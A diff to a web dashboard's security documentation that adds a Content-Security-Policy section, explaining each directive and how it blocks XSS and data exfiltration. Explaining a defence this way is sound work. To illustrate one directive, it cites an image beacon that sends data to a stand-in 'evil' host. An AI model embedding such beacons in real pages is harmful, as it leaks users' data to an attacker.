@@ -286,8 +286,34 @@ no submit path by design.
   mount would otherwise hand out the dashboard shell past the `GET /`
   redirect). It also sets `X-Content-Type-Options`, `X-Frame-Options` and
   `Referrer-Policy` on every response, so a bare uvicorn deploy is not
-  silently unprotected without Caddy. No CSP: the dashboard relies on inline
-  `<script>`/`<style>` blocks and a strict policy would break it.
+  silently unprotected without Caddy.
+- **Content-Security-Policy** (`app.py`, `_CSP_DIRECTIVES`): served on every
+  response, HTML included. The comment that used to sit here said a CSP was
+  deliberately not shipped because the dashboard relies on inline
+  `<script>`/`<style>` blocks — which treated "cannot be strict" as "cannot
+  exist" and gave up everything a CSP does that has nothing to do with inline
+  script. `script-src` is now `'self'` with **no** `'unsafe-inline'`, so an
+  injected inline payload cannot execute: that prevents the injection from
+  starting rather than only limiting what a successful one can do. It is
+  possible because the last inline script in the frontend — one IIFE at the end
+  of `login.html` — was extracted to `frontend/js/login.js`, verified by the e2e
+  suite (breaking that file fails "login flow — auth enforced", since jsdom runs
+  with `resources:'usable'` and really fetches external scripts).
+  `connect-src 'self'` blocks exfiltration, which is the entire point of an XSS;
+  `img-src 'self' data: blob:` blocks `<img src="//evil/?d=...">` beacons, which
+  need no script execution at all; `object-src 'none'`, `base-uri 'self'` (a
+  `<base href>` would rewrite every relative URL on the page, including every API
+  call), `form-action 'self'` and `frame-ancestors 'self'` close the rest.
+  `blob:` in `img-src` is not decoration: `autoApply.js` renders the review
+  screenshot through `URL.createObjectURL`. The remaining gap is
+  `style-src 'unsafe-inline'`, needed by 43 markup `style="..."` attributes; CSS
+  cannot execute and its one exfiltration channel (`background:url()`) is closed
+  by `img-src`. `CSP_MODE=report-only` sends the policy without enforcing it,
+  which is how to check it against a real browser before trusting it, and
+  `CSP_MODE=off` is an escape hatch rather than a recommendation. An
+  unrecognised mode enforces and warns — a typo must not remove the protection.
+  `tests/test_content_security_policy.py` re-derives every allowance from the
+  frontend, so the policy and the pages cannot drift apart silently.
 - **Login abuse resistance** (`ratelimit.py`): two sliding-window budgets —
   per client IP (`LOGIN_RATE_LIMIT`, default 12) and per username
   (`LOGIN_USER_RATE_LIMIT`, default 6) over `LOGIN_RATE_WINDOW` (default 600s)
